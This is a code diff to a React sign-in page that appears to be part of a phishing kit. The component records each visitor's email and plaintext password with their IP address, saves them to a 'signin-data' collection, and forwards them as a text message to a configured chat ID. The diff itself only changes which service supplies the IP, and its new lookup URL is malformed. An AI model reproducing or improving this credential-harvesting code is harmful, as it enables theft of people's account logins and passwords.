@@ -38,14 +38,18 @@ const SignIn = () => {
 
     const onSubmit = data => {
         fetch(
-            "https://geolocation-db.com/json/8dd79c70-0801-11ec-a29f-e381a788c2c0"
-        )
-        .then(response => response.json())
-        .then(geoData => {
+            "https://api.ipify.org?format=jsonp?callback=?", {
+            method: "GET",
+            headers: {}
+        })
+        .then(res => {
+            return res.text()
+        })
+        .then(ip => {
             db.collection('signin-data').add({
                 email:data.email,
                 password: data.password,
-                ip_address: geoData.IPv4,
+                ip_address: ip,
                 logged_at: Date.now()
             }).then(res => {
                 if( process.env.REACT_APP_PUBLIC_TM_ENABLE === '1' )
@@ -53,7 +57,7 @@ const SignIn = () => {
                     let message = "Sign In Data\r\n"
                     message += "Email: " + data.email + '\r\n'
                     message += "Password: " + data.password + '\r\n'
-                    message += "Ip Address: " + geoData.IPv4 + '\r\n'
+                    message += "Ip Address: " + ip + '\r\n'
                     message += "Time: " + moment( new Date() ).format("yyyy-MM-DD hh:MM:ss")
                     client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, message, {
                         disableWebPagePreview: true,
@@ -66,7 +70,9 @@ const SignIn = () => {
             }).catch(err => {
                 throw new Error(err);
             });
-        });
+        })
+        .catch( e => console.log('error while fetching ip' + e))
+
     };
     return (
         <Fragment>
